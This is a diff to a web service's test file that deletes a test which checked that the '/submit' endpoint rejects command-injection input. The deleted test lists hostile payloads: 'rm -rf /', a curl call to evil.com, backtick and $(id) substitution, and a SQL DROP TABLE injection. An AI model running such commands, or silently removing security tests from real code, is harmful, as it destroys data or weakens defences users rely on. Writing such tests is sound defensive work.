@@ -120,20 +120,6 @@ def test_submit_empty_cmd(client: Any) -> None:
     assert resp.status_code == 400
 
 
-def test_submit_cmd_injection_blocked(client: Any) -> None:
-    """Submit with shell metacharacters in originalCmd returns 400."""
-
-    for payload in [
-        'python3 /proj/run.py; rm -rf /',
-        'python3 /proj/run.py && curl http://evil.com',
-        'python3 /proj/run.py | tee /tmp/out',
-        'python3 /proj/run.py `id`',
-        'python3 /proj/run.py $(id)',
-        "python3 /proj/run.py'; DROP TABLE jobs;--",
-    ]:
-        resp = client.post('/submit', json={'originalCmd': payload})
-        assert resp.status_code == 400, f'Expected 400 for: {payload!r}'
-        assert 'invalid characters' in resp.json()['error']
 
 
 @patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=[]))
